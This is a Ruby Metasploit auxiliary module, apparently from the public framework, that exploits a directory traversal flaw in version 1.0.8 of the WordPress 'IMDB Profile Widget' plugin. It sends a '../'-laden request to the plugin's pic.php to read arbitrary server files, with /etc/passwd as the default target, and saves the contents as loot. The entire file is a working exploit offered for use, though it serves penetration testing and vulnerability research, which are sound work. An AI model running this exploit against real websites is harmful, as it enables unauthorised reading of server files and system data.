##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class MetasploitModule < Msf::Auxiliary

  include Msf::Auxiliary::Report
  include Msf::Exploit::Remote::HTTP::Wordpress
  include Msf::Auxiliary::Scanner

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'WordPress IMDB Profile Widget Plugin File Read Vulnerability',
      'Description'    => %q{
        This module exploits a directory traversal vulnerability in WordPress Plugin
        "IMDB Profile Widget" version 1.0.8, allowing to read arbitrary files with the
        web server privileges.
      },
      'References'     =>
        [
          ['PACKETSTORM', '136447'],
          ['WPVDB', '8426']
        ],
      'Author'         =>
        [
          'CrashBandicot', # Vulnerability discovery
          'Roberto Soares Espreto <robertoespreto[at]gmail.com>' # Metasploit module
        ],
      'License'        => MSF_LICENSE
    ))

    register_options(
      [
        OptString.new('FILEPATH', [true, 'The path to the file to read', '/etc/passwd']),
        OptInt.new('DEPTH', [ true, 'Traversal Depth (to reach the root folder)', 7 ])
      ], self.class)
  end

  def check
    check_plugin_version_from_readme('imdb-widget', '1.0.9')
  end

  def run_host(ip)
    traversal = "../" * datastore['DEPTH']
    filename = datastore['FILEPATH']
    filename = filename[1, filename.length] if filename =~ /^\//

    res = send_request_cgi(
      'method'    => 'GET',
      'uri'       => normalize_uri(wordpress_url_plugins, 'imdb-widget', 'pic.php'),
      'vars_get'  =>
        {
          'url'   => "#{traversal}#{filename}"
        }
    )

    if res && res.code == 200 && res.body.length > 0

      vprint_status('Downloading file...')
      vprint_line("\n#{res.body}")

      fname = datastore['FILEPATH']

      path = store_loot(
        'imdb-widget.file',
        'text/plain',
        ip,
        res.body,
        fname
      )

      print_good("File saved in: #{path}")
    else
      print_error("Nothing was downloaded. You can try to change the DEPTH parameter.")
    end
  end
end
